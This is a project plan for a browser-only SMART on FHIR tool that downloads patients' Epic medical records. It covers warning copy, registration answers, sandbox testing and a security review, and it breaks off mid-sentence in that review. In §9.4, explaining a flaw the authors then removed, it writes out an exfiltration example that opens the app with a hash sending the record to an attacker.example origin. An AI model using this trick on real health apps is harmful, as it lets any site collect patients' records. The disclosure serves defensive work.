# health.circlejtp.me — Plan

A self-hosted deployment of the SMART on FHIR record retriever, with a landing page that
explains the user's legal right to their record and warns them, unambiguously, about what
they take on when they exercise it.

**Status:** planning. Nothing here is deployed yet.

> **This document contains draft legal language written by a non-lawyer.** The warning and
> disclaimer sections are drafted to be clear and honest, not to be enforceable. Liability
> disclaimers vary by jurisdiction and some cannot be disclaimed at all. Have counsel review
> before this goes live. See [Legal review checklist](#11-legal-review-checklist).

---

## 1. Why this site exists

Two audiences, one page:

1. **Patients** — people who want a copy of their own medical record and need to understand,
   before they start, that the copy becomes theirs to protect.
2. **Epic** — app registration requires a **Public Documentation URL**. This page is that URL.
   It needs to credibly describe what the app does, who operates it, and how data is handled.

The second audience is why this page cannot be a stub. Epic reviews it.

---

## 2. What actually happens (the factual basis for every claim on the page)

Every privacy claim below is a consequence of the architecture, not a promise. This matters:
we should only assert what the code actually does.

```
  Health system (Epic)                  User's browser                  User's disk
  ────────────────────                  ──────────────                  ───────────
  authorize  ──────────────────────────▶  SMART login + consent
  token      ◀─────────────────────────▶  PKCE code exchange
  FHIR R4    ─────────────────────────▶   fetch + parse attachments
                                          build ClientFullEHR  ────────▶  ehr-data.json
```

**The server never sees the record.** `health.circlejtp.me` serves static HTML/JS. The browser
talks directly to the health system's token and FHIR endpoints. In the download flow there is
no POST to any server we operate — the file is written by the browser to the user's disk.

Verified in code:
- `ehretriever.ts` — `initiateSmartAuth()` does SMART discovery, PKCE (S256), redirect to the
  health system's own authorization endpoint.
- Token exchange posts directly to the health system's `token_endpoint`.
- With no delivery target configured, the retriever shows a Download button and calls
  `triggerJsonDownload(...)`. No network egress to our origin.

**Consequences we may truthfully state:**
- We do not receive, store, or transmit the record.
- We cannot access it, produce it under subpoena, or leak it — we never hold it.
- We have no accounts, no server-side logging of health data, and no analytics on the record.

**Consequence we must NOT obscure:** none of that protects the file once it lands on the user's
disk. That is the entire point of the warning.

---

## 3. Page structure

Single page, top-to-bottom narrative. The warning is not buried in a footer or a linked
"Terms" page — it sits above the action, and the action is gated behind acknowledging it.

| # | Section | Purpose |
|---|---------|---------|
| 1 | Hero | What this is, in one sentence |
| 2 | Your right to this data | Cures Act / HIPAA access right, with citations |
| 3 | **Before you begin — read this** | The warning. Visually dominant. |
| 4 | How it works | The data-flow diagram from §2 |
| 5 | What we do not do | The architectural privacy claims |
| 6 | Protecting the file | Practical, actionable security guidance |
| 7 | Connect | Gated behind the acknowledgment checkbox |
| 8 | Disclaimer | No warranty, no liability |
| 9 | References | Statutes, regulations, official guidance |

---

## 4. Draft copy

### 4.1 Hero

> ## Get a copy of your own medical record
>
> Connect to your health system and download a complete, machine-readable copy of your
> medical record — conditions, medications, lab results, immunizations, clinical notes and
> attachments — directly to your own computer.
>
> Federal law gives you the right to this data. This tool helps you exercise it.
>
> **The copy is yours. So is the responsibility for protecting it.** Read the warning below
> before you begin.

### 4.2 Your right to this data

> ### Federal law is on your side
>
> The **21st Century Cures Act** (Pub. L. No. 114-255) and the regulations implementing it
> require certified health IT to give you standardized API access to your electronic health
> information — the same mechanism this tool uses.
>
> - **Your right of access.** Under HIPAA, you have the right to obtain a copy of your health
>   information, and to direct a covered entity to send it to a third-party application you
>   choose. *45 CFR § 164.524(a)(1), (c)(2)(ii), (c)(3)(ii).*
> - **Standardized API access.** Certified health IT must support a standardized FHIR-based
>   API for patient access. *45 CFR § 170.315(g)(10).*
> - **Information blocking.** Health care providers, health IT developers, and health
>   information networks may not unreasonably interfere with your access to your electronic
>   health information. *45 CFR Part 171.*
> - **Payer data.** CMS-regulated payers must expose claims and encounter data through a
>   patient access API. *CMS Interoperability and Patient Access Final Rule (CMS-9115-F).*
>
> This tool is a standard SMART on FHIR application. Your health system authenticates you
> directly and asks for your consent. We never see your credentials.

### 4.3 The warning — primary copy

Visual treatment: full-width panel, high-contrast border, warning icon, largest body type on
the page. Not dismissible. Not collapsed by default.

> ## ⚠ Before you begin — please read this carefully
>
> ### This creates a permanent copy of your medical record on your computer.
>
> When you use this tool, a complete copy of your health information is downloaded to the
> device you are using. That file may include:
>
> - Diagnoses and medical conditions, including ones you may consider sensitive
> - Medications, including psychiatric and substance-use treatment
> - Laboratory and diagnostic results
> - Clinical notes written about you by your care team
> - Immunizations, procedures, allergies, and care plans
> - Insurance and demographic information
> - Scanned documents and attachments
>
> **This is among the most sensitive information that exists about you.**
>
> ### Once it is on your computer, HIPAA no longer protects it.
>
> This is the part people most often misunderstand, so we want to be direct about it.
>
> HIPAA governs your health system, not you and not this tool. The U.S. Department of Health
> and Human Services has stated plainly that the HIPAA Rules **"do not impose any restrictions
> on how an individual or the individual's designee, such as an app, may use the health
> information that has been disclosed pursuant to the individual's right of access."**
>
> The moment that file is written to your disk, the legal protections that applied to it
> inside your health system's systems no longer apply. There is no federal agency overseeing
> how that copy is stored on your laptop.
>
> ### Protecting it is entirely your responsibility.
>
> You — and only you — are responsible for the confidentiality, integrity, and security of
> the copy you create. That includes every consequence of it being exposed, whether through:
>
> - A lost, stolen, or unencrypted device
> - An unencrypted backup, or a cloud sync folder you forgot was syncing
> - Malware, or another person with access to your computer
> - Sending, sharing, or uploading the file — including to an AI service or chatbot
> - Any other disclosure, intentional or accidental
>
> Disclosure of this information can affect your employment, your relationships, your
> insurance, and your safety. Health information cannot be un-disclosed. Unlike a password,
> you cannot rotate your diagnoses.
>
> ### We accept no responsibility or accountability for what happens next.
>
> We do not receive, store, or transmit your health information at any point — it travels
> from your health system directly to your browser and onto your device. We therefore have
> no ability to protect, recover, delete, or control that copy.
>
> **By choosing to download your record, you accept sole and complete responsibility for it.
> We disclaim any and all responsibility, accountability, and liability for the security,
> confidentiality, storage, use, disclosure, or loss of the copy you create, and for any
> harm arising from it.**
>
> If you are not prepared to secure this file yourself, **do not proceed.**

### 4.4 What we do not do

> ### We never see your record
>
> - **No servers.** This page is static. Your browser talks directly to your health system.
> - **No credentials.** You log in on your health system's own site. We never see your
>   username or password.
> - **No copies.** Your record is never transmitted to us. We could not produce it if
>   compelled to, because we never have it.
> - **No accounts, no tracking of your health data.**
>
> This is a design choice, not a policy promise — the architecture makes it so.

### 4.5 Protecting the file

> ### If you proceed, do these things
>
> 1. **Turn on full-disk encryption.** FileVault on macOS, BitLocker on Windows, LUKS on
>    Linux. Without it, anyone with the device has the file.
> 2. **Know where the file went.** It downloads to your Downloads folder by default. Move it
>    somewhere deliberate.
> 3. **Keep it out of cloud sync.** Desktop, Documents, and Downloads are often synced to
>    iCloud, OneDrive, Dropbox, or Google Drive automatically. Verify.
> 4. **Restrict permissions.** On macOS/Linux: `chmod 600` the file, `chmod 700` its folder.
> 5. **Think hard before sharing it.** Including with AI assistants — anything you paste may
>    be retained and reviewed.
> 6. **Delete it when you are done**, and empty the trash.
> 7. **On a shared or public computer, do not do this at all.**

### 4.6 Consent gate

The connect button is disabled until the box is checked. Checkbox state is not persisted —
it must be checked each visit.

> ☐ I have read the warning above. I understand that a copy of my medical record will be
> stored on this device, that HIPAA protections do not extend to that copy, and that I am
> solely responsible for its security. I accept that the operators of this site bear no
> responsibility or liability for it.
>
> [ Connect to my health system ]

### 4.7 Disclaimer

> ### Disclaimer
>
> This tool is provided **"as is" and "as available", without warranty of any kind**, express
> or implied, including but not limited to warranties of merchantability, fitness for a
> particular purpose, accuracy, completeness, and non-infringement.
>
> **Not medical advice.** This tool retrieves and displays records. It does not interpret
> them. Nothing here is medical advice. Do not make health decisions based on this data
> without consulting a qualified clinician.
>
> **No guarantee of completeness or accuracy.** The data comes from your health system. It
> may be incomplete, out of date, or wrong. A record retrieved here is not a certified copy
> of your legal medical record. Records held by other providers will not appear. For an
> official copy, contact your health system's medical records department.
>
> **No liability.** To the maximum extent permitted by law, the operators shall not be liable
> for any direct, indirect, incidental, special, consequential, or exemplary damages arising
> from the use of this tool or from the creation, storage, disclosure, or loss of any copy of
> health information created through it.
>
> **Independent operator.** This site is not affiliated with, endorsed by, or sponsored by
> Epic Systems Corporation or any health system.

### 4.8 References

Every citation linked to its authoritative source:

| Reference | Citation | Link |
|---|---|---|
| 21st Century Cures Act | Pub. L. No. 114-255 | congress.gov |
| ONC Cures Act Final Rule | 85 FR 25642 | federalregister.gov |
| HIPAA right of access | 45 CFR § 164.524 | ecfr.gov |
| Standardized API criterion | 45 CFR § 170.315(g)(10) | ecfr.gov |
| Information blocking | 45 CFR Part 171 | ecfr.gov |
| CMS Interoperability & Patient Access | CMS-9115-F | cms.gov |
| OCR: access right, health apps & APIs | — | hhs.gov |
| FTC Health Breach Notification Rule | 16 CFR Part 318 | ecfr.gov |

---

## 5. Brand directory refresh

**The problem this solves.** The brand file bundled with the upstream project was generated
**2025-04-06**. By August 2026 it listed Mayo Clinic at `mcc.api.mayo.edu`, a hostname whose
CNAME no longer resolves. The connect flow failed with an opaque "Load failed" and no way for
a user to diagnose it. A directory that goes stale is a silent, growing outage.

### 5.1 Source

```
https://open.epic.com/Endpoints/Brands
```

Verified characteristics:

| Property | Value |
|---|---|
| Format | FHIR `Bundle` — `Organization` + `Endpoint` resources |
| Size | ~90 MB (94,601,978 bytes as of 2026-08-30) |
| Content | 96,627 Organizations, 817 Endpoints |
| Headers | `Cache-Control: private`; **no `ETag`, no `Last-Modified`** |
| Download time | ~4–5 minutes (~350 KB/s observed) |

**No cheap change detection.** Without `ETag`/`Last-Modified`, a `HEAD` request tells us
nothing. The job must download the full bundle and compare content hashes.

### 5.2 Pipeline

```
open.epic.com/Endpoints/Brands          (~90 MB raw bundle)
        │
        ▼  static/brands/process-brands.ts --brands <bundle>
   epic.json                             (~49 MB, ~3.7 MB gzipped)
        │
        ▼  publish
   health.circlejtp.me/brands/epic.json
```

The processing script already exists and runs in under a second.

### 5.3 Schedule and job design

**Weekly**, Sundays 06:00 UTC. Epic's directory changes on the order of organizations
onboarding and endpoints migrating — daily is wasteful for a 90 MB download, monthly leaves
too long a window for a dead-endpoint outage like Mayo's.

```
1. Download the bundle (retry with backoff; the endpoint is slow and occasionally times out)
2. Sanity-gate the download:
     - parses as JSON
     - resourceType == "Bundle"
     - Organization count within ±20% of the previous run   ← guards against truncation
3. Run process-brands.ts
4. Hash the output; compare to the currently published hash
5. If unchanged → exit, log a no-op
6. If changed → publish, and record a summary:
     - orgs added / removed
     - endpoint URLs changed  ← the Mayo case; worth alerting on
7. On failure → alert, and leave the existing file in place
```

**Step 2 is not optional.** A truncated 21 MB download would otherwise silently publish a
directory missing three quarters of all health systems. Fail closed: a stale directory is
much better than a broken one.

### 5.4 Storage

Do **not** commit the bundle or the processed output to git. A 49 MB file committed weekly
adds ~2.5 GB/year of history that can never be pruned without a rewrite. Instead:

- Raw bundle: discarded after processing (re-downloadable at any time)
- Processed `epic.json`: **Cloudflare R2**, served via the site
- Only the pipeline code lives in git

Cloudflare compresses on the fly, so the wire cost is ~3.7 MB.

### 5.5 Possible optimization (not required for v1)

`epic.json` is 49 MB largely because it carries a per-facility entry with full address for
96,627 organizations. A slimmer search index — brand name, id, endpoint URL, plus a separate
lookup for facility detail — would cut this by an order of magnitude. Worth doing only if
load time proves to be a problem in practice.

---

## 6. Infrastructure

| Concern | Decision |
|---|---|
| Host | Cloudflare Pages, subdomain `health.circlejtp.me` |
| Build | Static; retriever bundled via `scripts/build-ehretriever.ts` |
| Brand file | Cloudflare R2, refreshed by the weekly job |
| TLS | Cloudflare-managed |
| Headers | HSTS; strict CSP; `Referrer-Policy: strict-origin-when-cross-origin` |
| Analytics | None on the connect flow. If any, privacy-preserving and never on record data. |

**CSP note.** The retriever must `fetch` arbitrary health-system FHIR endpoints, so
`connect-src` cannot be locked to `'self'`. Everything else (`script-src`, `style-src`)
should be tightly restricted.

---

## 7. Epic app registration

The registration form is already open and partially filled. Decisions that bind to this site:

| Field | Value | Note |
|---|---|---|
| Application Name | TBD | Patients see this on the Epic consent screen — choose something recognizable |
| Application Audience | Patients | |
| **Automatic Client Distribution** | **USCDI v3** | Critical. `None` requires each organization to enable the app individually. |
| Public Documentation URL | `https://health.circlejtp.me` | **Must be live before submitting** |
| Redirect URI | `https://health.circlejtp.me/ehr-callback` | Plus `https://localhost:8443/ehr-callback` for local development |
| Confidential client | **No** — public client | Browser JS cannot hold a secret |
| PKCE | S256 | Already implemented |
| FHIR version | R4 | |

**Constraint on API selection:** to stay eligible for automatic distribution, select only
USCDI-covered APIs. Adding others can drop the app back to manual per-organization
distribution, which is what makes an app unusable at a health system like Mayo.

---

## 7.1 Registration outcome (2026-08-30)

App **My Health Record Access** created. Client IDs issued (not secret — a public client's id
ships in the browser bundle by design):

| | |
|---|---|
| Production Client ID | 1Password → Employee → Epic → *Production Client ID* |
| Non-Production Client ID | 1Password → Employee → Epic → *Non-Production Client ID* |

**Marking the app ready for production is a one-way door.** Epic states the app cannot be
edited afterwards, so use *Save & Ready for Sandbox* until everything is settled.

Settings worth not changing without understanding why:

- **FHIR ID Generation Scheme → Use Unconstrained FHIR IDs.** The alternative truncates ids
  to 64 characters for USCDI resources. Real Epic ids already collected run past 90
  characters, and `resource_id` is part of the database primary key, so truncation would
  change identity and break idempotent re-import.
- **SMART Scope Version → SMART v1.** Then the retriever must request `patient/*.read`.
  The `patient/*.rs` string in the inherited configs is SMART **v2** syntax and will not work
  against a v1 registration.
- **Intended Purposes → Individuals' Access to their EHI**, Intended Users →
  Individual/Caregiver. "Research" is about research *use* of data and does not apply here.

Fields that did not persist through the first save, so re-check them: **Public Documentation
URL** reverted to the `http://www.example.com` placeholder.

### Submitted copy

Patients see these on Epic's consent screen, and Epic's reviewers read them, so both lead with
the data flow rather than with features: that is the unusual property here, it is the basis for
every privacy claim the site makes, and it distinguishes this from apps that aggregate records
server-side. The responsibility shift is stated here as well as on the site so the registration
matches what a patient actually encounters.

**Summary**

> This app lets you download a copy of your own health record as a JSON file directly to your
> device, after you acknowledge that securing that data becomes your responsibility. It is
> intended to help people study and understand their own health history.

**Description**

> My Health Record Access helps you obtain a complete copy of your own medical record and save
> it directly to your computer, in a standard machine-readable format you can keep, search, and
> use however you choose.
>
> You sign in with your health system directly — this app never sees your username or password.
> Your record is then fetched by your own browser and written straight to your device. It is
> never transmitted to, or stored on, any server operated by this app. There are no accounts,
> and no tracking of your health information.
>
> Because the copy lives on your device, protecting it becomes your responsibility. HIPAA's
> protections apply to your health system, not to a file on your own computer. The app states
> this plainly before you connect and asks you to acknowledge it.
>
> Federal law — the 21st Century Cures Act and your HIPAA right of access — gives you the right
> to this data. This is an independent, free, non-commercial tool that helps you exercise it.

### Data Use Questionnaire answers

Health systems rely on these when deciding whether to trust the app, so each is derived from
what the code does rather than from what reads best. Recorded verbatim because the app becomes
uneditable once marked ready for production.

**1. Where does this app store user data? (Select all that apply.)**
> `This app can store user data locally on the user's device.` — this option only.

`This app does not store user data.` is **not** selected: the download writes a file to the
user's disk and sessionStorage briefly holds the token, both of which are storage on the device.

**2. For how long does this app store user data?**
> `This app stores your data for:` with the text
> *"the browser session only; any downloaded copy remains on the user's device under the user's
> sole control until they delete it"*

`This app stores your data indefinitely.` is not selected — it reads as the developer retaining
data, which never happens.

**3. Does this app allow users to delete all of the data that have been stored about them?**
> `Yes, this app allows users to delete all of the data that have been stored about them.`

**4. Other than the user, who has access to user data? (Select all that apply.)**
> `No one; data never leaves the user's device.` — this option only.

The "users authorize" options are not selected: the app provides no sharing mechanism, and a
user forwarding the file themselves is not the app granting access.

**5. Does the app developer allow users to obtain a complete record of the data that have been
collected about them?**
> `Yes, the app developer allows users to obtain a complete record of the data that have been
> stored about them.`

**6. Does the app developer use data about a user for reasons other than providing direct
services to the user?**
> `No, the app developer doesn't use data about users beyond providing direct services.` — this
> option only.

**7. What other individuals from the user's health record does the app use data about beyond
providing direct services? (Select all that apply)**
> `No one.` — this option only.

The record may contain RelatedPerson entries, but the app does not *use* that data; it hands
the whole record to the user.

**8. Does this app allow users to obtain a complete record of who has accessed data about them?**
> `Yes, this app allows users to obtain a complete record of who has accessed data about them.`

**9. Is user data retained after a user deletes the app and closes their account?**
> `No.`

### Second questionnaire (first-person wording)

Epic presents a second questionnaire covering similar ground in first person. Verbatim:

**Which option best describes the company offering the app to users/patients?**
> `An individual or independent developer.`

**Do you have a business associate agreement with each covered entity your app will connect to?**
> `No.`

Correct and expected: under the HIPAA right of access, an app a patient directs their data to
is not a business associate of the covered entity. The app acts for the patient, not for the
health system, so a BAA is the wrong instrument.

**How is this app funded? (Select all that apply.)**
> `This app is produced by volunteers or is available in the open source community.` — this
> option only.

**Where can this app store user data? (Select all that apply.)**
> `Locally on the user's device.` — this option only.

**Other than the user, who has access to user data? (Select all that apply.)**
> `No one; data never leaves the user's device.` — this option only.

**For entities that can access user data, will the user specifically approve and be notified of
each access...?**
> `Users specifically approve each time their information is accessed or shared.`

Every retrieval requires the user to initiate it and authorize through their health system's
own consent screen; nothing happens in the background.

**Do you allow users to obtain a record of the data that have been collected about them?**
> `We allow users to obtain a complete record of the data that have been collected about them.`

**Does this app allow users to delete the data that have been stored about them?**
> `This app allows users to delete all of the data that we have stored about them.`

**Do you retain user data after a user deletes the app and closes their account?**
> `No.`

**Other than providing direct service to the user, how do you use data about the user? (Select
all that apply.)**
> `We don't use data about users beyond providing direct services.` — this option only.

**For how long does this app store user data?**
> `This app stores user data for:` with the text
> *"the browser session only; any downloaded copy remains on the user's device under the user's
> sole control until they delete it"*

This version of the question **does** offer `This app does not store user data.`, unlike the
first questionnaire. Do not select it: "Where can this app store user data?" was answered
*locally on the user's device*, and answering "does not store" here contradicts that. A
reviewer comparing the two would see the inconsistency.

**Does this app allow users to obtain a record of who has accessed data about them?**
> `This app allows users to obtain a complete record of who has accessed data about them.`

#### On questions 5 and 8

Nothing is collected and nobody accesses anything, and neither question offers an "N/A".
"Yes, complete" was chosen because the "No" options carry a false implication — *does not allow
users to obtain a record of the data stored about them* reads as withholding data the developer
holds, and there is none. The counter-argument is that "Yes" may imply a data-access-request
feature that does not exist; the substance is that there is nothing to show because nothing
exists, and "Yes" conveys that better than "No". Revisit if counsel disagrees.

**These answers commit the project to the browser-only architecture.** Combined with Epic making
the app uneditable once production-ready, introducing any server-side component that received
record data would render them false with no way to correct them.

Still outstanding on the form: Terms and Conditions URL (now `https://health.circlejtp.me/terms`),
the Description field, the Data Use Questionnaire, and accepting the open.epic terms of use.

### 7.2 Sandbox testing notes (2026-08-30)

First end-to-end attempt against Epic's sandbox, driven through a real browser.

**Working:** the preview gate, the sandbox brand file, SMART discovery, and the authorize URL
the retriever builds:

```
client_id=<non-production client id>            (1Password → Employee → Epic)
scope=patient/*.read                              (SMART v1, as registered)
redirect_uri=https://health.circlejtp.me/ehr-callback
code_challenge_method=S256
```

**Blocked at Epic's authorize step** with a generic "OAuth2 Error — Something went wrong trying
to authorize the client."

Diagnosis by elimination, since the error text carries no detail:

| Variable | Result |
|---|---|
| `aud` with vs without trailing slash | no difference |
| `patient/*.read` vs `openid fhirUser patient/Patient.read` | no difference |
| Upstream's known sandbox client id | same error |
| **All-zeros bogus client id** | **identical error** |

The bogus-client control is the informative one: Epic returns this page for a client it does
not recognise, and our client is indistinguishable from one that does not exist. So the
non-production client id is not yet active in the sandbox.

**Expect this to take far longer than Epic's own documentation implies.** The app-request
guidance says requests "typically appear within 5 minutes, but please allow an hour"; reports
from other developers put sandbox client synchronisation at **12 hours or more, sometimes a
day or two**. Still failing at 12 minutes means nothing. Retry rather than change
configuration — nothing in the request is wrong, and changing settings while waiting only
makes it harder to tell what fixed it.

There is no notification when it activates, and the error page is byte-identical throughout,
so `scripts/check-epic-sandbox.sh` polls the authorize endpoint and exits 0 once Epic stops
serving the error page.

### 7.3 Client activated (2026-09-01)

`scripts/check-epic-sandbox.sh` went green at 11:16 local, **roughly 41 hours** after the
first failed sandbox test recorded in §7.2 (the registration was saved some time before that,
so this is a lower bound). Either way it is well outside Epic's "allow an hour" guidance and
at the long end of the 12-hours-to-two-days range other developers report. Nothing about the
request was changed in between; the wait was the whole fix.

The authorize endpoint now serves `<title>MyChart - Login Page</title>` where it previously
served the OAuth2 error. The same bogus all-zeros client id used in the §7.2 diagnosis still
returns `OAuth2 Error`, which is what makes this a real signal rather than a change in Epic's
behaviour for everyone:

| Client id | Response |
|---|---|
| ours | MyChart login page |
| all-zeros control | `OAuth2 Error` |

**What this does and does not prove.** It proves the client id resolves and Epic will render a
login. It does **not** validate the scopes, `redirect_uri`, or `aud` — those are rejected
*after* login, and the error page was masking every one of them equally. Step 4 of the build
order is still genuinely untested until a full round trip lands a record.

### 7.4 Full round trip verified (2026-09-01)

Completed against the sandbox test patient. **Step 4 is done: a record came out.**

`ehr-data.json`, 827 KB, **325 resources** for Camila Maria Lopez (`erXuFYUfucBZaryVksYEcMg3`):

| Count | Resource |
|---|---|
| 256 | Observation |
| 13 | Condition |
| 12 | Goal |
| 11 | Practitioner |
| 5 | Encounter / Location |
| 4 | DocumentReference / DiagnosticReport / ServiceRequest |
| 3 | Organization |
| 1 each | Patient, AllergyIntolerance, Immunization, MedicationRequest, Procedure, CareTeam, Specimen, Medication |

Attachment fetching works end to end: 5 attachments with both `contentPlaintext` and
`contentBase64` populated, including binary fetches through `Binary/…` references and an RTF
document. SMART discovery succeeded on the first attempt this time — the 503 in §7.2 was
intermittent, as suspected.

**The unconstrained-FHIR-ID setting was the right call.** Real ids in this pull run to 45
characters (`eeIUePPFhkOlGgtsbPko4a4tPlKY9045CYysh7Ryulnc3`); the 64-char truncation the
alternative scheme applies would be a live hazard, not a theoretical one.

#### Defects this surfaced

70 console errors. Grouped, they are three distinct problems, only the first of which is ours:

1. **Double-slash URL construction.** `clientFhirUtils.ts:662` builds
   `${fhirBaseUrl}/${resourceType}?…` and :677 does the same for Patient, but the brand
   endpoint already ends in `/`, so every request goes to `…/api/FHIR/R4//Observation`. Epic
   tolerates it for most paths — the bulk of the pull succeeded — so this is latent rather
   than fatal, but `src/utils.ts` already has `resolveFhirUrl()` that normalises correctly and
   these two call sites should use it.

2. **Searches Epic rejects as malformed.** `Practitioner`, `Organization`, `Specimen`,
   `CarePlan`, and `Observation?category=mental-health` all return
   `400 Unknown parameter: PATIENT`. *Initially misdiagnosed as these types not supporting a
   `patient` search parameter — see §7.5, where fixing the doubled slash made most of them
   succeed.*

3. **403s on reference-following.** 22 `Observation` reads plus `Encounter`, `ServiceRequest`
   and `Specimen` reads return 403. The crawler follows references into resources the granted
   scope does not cover. Expected behaviour, but it should be logged as a skip rather than an
   error.

One `400 Invalid FHIR ID provided` on a `Procedure` read is unexplained and worth a look.

**Also observed:** SMART discovery returned `503 Service Unavailable` on the first attempt and
succeeded on the next, with the endpoint returning 200 on five consecutive probes from outside
the browser. Epic's sandbox discovery is intermittently flaky; a retry with backoff around
discovery would turn a dead end into a hiccup.

---

## 8. Build order

| # | Step | Status |
|---|---|---|
| 1 | Domain / DNS for `health.circlejtp.me` | **done** — custom domain on the Worker |
| 2 | Ship the landing page (warning + consent gate are v1, not a follow-up) | **done** — live |
| 3 | Brand refresh job; publish `epic.json` to R2 | **done** — seeded, weekly cron `0 6 * * SUN` |
| 4 | Wire the retriever build to the brand file; verify a real connect end to end | **done** — 325 resources + 5 attachments retrieved from the sandbox 2026-09-01 (§7.4) |
| 5 | Legal review (§11) — a gate, not a formality, given §9.1 | **outstanding** |
| 6 | Submit the Epic app registration with the live documentation URL | ready to submit |

**Deployed 2026-08-30 with `EPIC_CLIENT_ID` empty.** This was deliberate: it gives Epic a live
Public Documentation URL to review, so registration lead time runs in parallel with legal
review rather than after it, while nobody can actually download a record. The page states
plainly that the connect flow is unavailable instead of offering a button that would fail.

Two independent things must both land before anyone can use it — setting `EPIC_CLIENT_ID`,
and building the retriever bundle into the site. Neither happens by accident, so steps 4 and 5
still gate the functional launch.

Do not enable the connect flow on a page whose legal language has not been reviewed.

---

## 9. Decisions made

### 9.1 This is an open tool, offered publicly

Anyone may use it. It is not personal infrastructure with incidental public access.

This is a deliberate choice and it raises the stakes on everything in §4 and §10:

- **The warning carries more weight, not less.** Users will arrive with no context, varying
  technical skill, and no relationship to the operator. The warning is the only thing standing
  between a person and a decision they cannot reverse. It must be readable by someone who has
  never heard the term "PHI" — which is why §4.3 avoids jargon and says "your diagnoses"
  rather than "your protected health information."
- **A duty of care plausibly attaches** that would not attach to a private tool. This makes
  legal review a gate on launch (§8), not a nicety.
- **The FTC Health Breach Notification Rule question becomes material**, not academic. See
  §10.
- **The named operator matters more.** Publishing under an individual's own name carries
  personal exposure that an entity does not. Resolve before launch.

What does *not* change: we still never receive the data. The architecture in §2 is what makes
offering this publicly defensible at all — there is no central store to breach, and no
population of records to lose.

### 9.2 The named operator is JT Perry

The site is operated by **JT Perry** (`jt.perry@gmail.com`) as an independent individual, and
says so in the disclaimer and the footer.

This was chosen with the trade-off understood: an individual's own name carries personal
liability in a way an entity does not, and the exposure grows because the tool is offered
publicly (§9.1). It remains on the list for counsel (§11) — forming an entity later is
possible, but the name is already published from this point.

Two practical consequences:

- A personal address on a public page will be harvested. If the volume becomes a problem, a
  Cloudflare Email Routing alias on `circlejtp.me` forwards to the same inbox and can be
  rotated without editing the site.
- The contact copy says plainly that there is nothing to request, correct, or delete, because
  no health information is held here. Without that, a contact address on a page about medical
  records invites requests that cannot be fulfilled.

### 9.3 `epic.json` is never committed to git

Confirmed. The processed brand file is published to R2 by the weekly job (§5.4); only the
pipeline code is versioned. Weekly commits of a 49 MB artifact would add roughly 2.5 GB of
unprunable history per year.

---

### 9.4 The retriever delivers nowhere but the user's disk

Upstream's retriever can hand the assembled record to somewhere other than the browser: POST it
to an endpoint named in `deliveryEndpoints`, or `postMessage` it to a web origin named in the
URL hash as `#deliver-to-opener:$origin`. Both were removed from this fork on 2026-09-01.

The postMessage path was the serious one. The origin came from the hash and was validated only
by `new URL(...)` parsing — it was **never compared against the actual opener's origin**. So any
website could call

```js
window.open('https://health.circlejtp.me/ehr-connect#deliver-to-opener:https://attacker.example')
```

and receive a complete medical record. The patient would see their own health system's login and
Epic's genuine consent screen naming *this* app; nothing in that flow reveals where the record
lands. The in-page confirmation printed the raw origin string, which does not help against
`https://health.circlejtp.me.attacker.example`. In effect the registration would have been a
credential any site could borrow to collect patient records.

That flow also contradicts what we told Epic. The Summary says the record is downloaded
"directly to your device"; both Data Use Questionnaires say data is stored "locally on the
user's device" and that "any downloaded copy remains on the user's device under the user's sole
control". A record delivered to a third-party origin is none of those things.

It made the landing page's claims misleading too. "We do not receive, store, or transmit the
record" stayed literally true — the Worker is not in that path — but the application we ship
would have transmitted it, which is not what a reader would understand.

Removed rather than restricted. An allowlist would have kept a capability nothing here uses:
`deliveryEndpoints` was already empty in `config.circlejtp.json`, and the site describes exactly
one way for data to leave the page. The code now has no delivery mechanism to constrain,
misconfigure, or explain. Delivery hashes are ignored.

**Verified end to end after removal (2026-09-01).** A full sandbox run produced 327 resources
across 18 types and 5 attachments, every one carrying both `contentPlaintext` and
`contentBase64`, RTF included. Nothing regressed when the delivery paths were cut, and the
download button is now the only way data leaves the page — which is what the Summary and both
Data Use Questionnaires say. 263 of those resources carry ids longer than 64 characters (max
88), which remains the argument for the unconstrained FHIR ID setting on the registration.

### 9.5 Accessibility is tested, and the claim is scoped to what was tested

**Target: WCAG 2.2 Level AA.** The page exists to make sure people understand a warning before
acting on it, so an inaccessible warning is a failed warning — and the audience skews toward
disability and assistive technology use.

Run against axe-core 4.13 with tags `wcag2a,wcag2aa,wcag21a,wcag21aa,wcag22aa` on 2026-09-01:

| Page state | Violations | Incomplete |
|---|---|---|
| `/` landing | 0 | 0 |
| `/terms` | 0 | 0 |
| `/ehr-connect` retriever | 0 | 0 |
| `/` with the consent gate unlocked | 0 | 0 |

29 rules passed on the landing page, `color-contrast` and `target-size` among them.

**The default scan has a blind spot worth knowing about.** The consent checkbox is `disabled`
on load and axe skips disabled controls, so a plain run never evaluates the most important
interactive element on the site — `#consent` simply does not appear in the `target-size` node
list. The fourth row above exists because of that: the page has to be re-tested with the gate
unlocked before the result means anything. Doing so settles an open question from the site
README: the checkbox is 22×22 CSS px and **passes** SC 2.5.8 on the spacing exception, which
axe implements. Marginal, but compliant; 24×24 would remove the argument.

**Keyboard walkthrough of the gate**, which axe cannot perform and which is where a redesign
would break it:

1. On load — checkbox and button both `disabled`; the live region reads *"Locked: read the
   warning section above…"*
2. `End` alone unlocks the checkbox. **The scroll condition is satisfiable from the keyboard**,
   not only by mouse, and the region updates to *"Warning read…"*
3. `Space` ticks the box; the button correctly stays disabled because no client id is
   configured, and the region explains why.

`aria-disabled` is `null` throughout — the platform `disabled` attribute is doing the
enforcement, not a visual imitation of it.

**What this does not establish.** axe catches 20–50% of issues by its own account. Untested:
screen-reader announcement quality and whether the live-region updates are voiced at the right
moment, reading order, focus visibility as rendered, and reflow at 320px and 200% zoom. Those
need a human with VoiceOver or NVDA. The public claim is therefore "built to meet WCAG 2.2 AA"
with an invitation to report gaps — a defensible statement backed by a clean automated pass and
a keyboard walkthrough, not a certification.

### 9.6 Pre-submission security assessment (2026-09-01)

An owner-authorised, read-only review of commit `886453d` and the live deployment. It
confirmed the architecture holds: the Worker never receives records or tokens, the SMART flow
is browser-to-EHR, output is a local Blob download, non-GET/HEAD returns 405, and `brandTags`
cannot influence the redirect URI, token endpoint, or record destination.

| | Finding | Disposition |
|---|---|---|
| C-01 | Committed `PREVIEW_TOKEN` bypasses the pre-launch gate | Accepted for now |
| H-01 | Brand metadata rendered via `innerHTML` | Already fixed |
| H-02 | OAuth code left in the callback URL | Fixed |
| H-03 | Token-bearing crawler follows arbitrary absolute URLs | Fixed |
| H-04 | CSP could be tightened | Fixed |
| H-05 | Sandbox credentials in the public bundle | Fixed |

**C-01 accepted, with the reasoning stated.** `retrieverAllowed()` returns true unconditionally
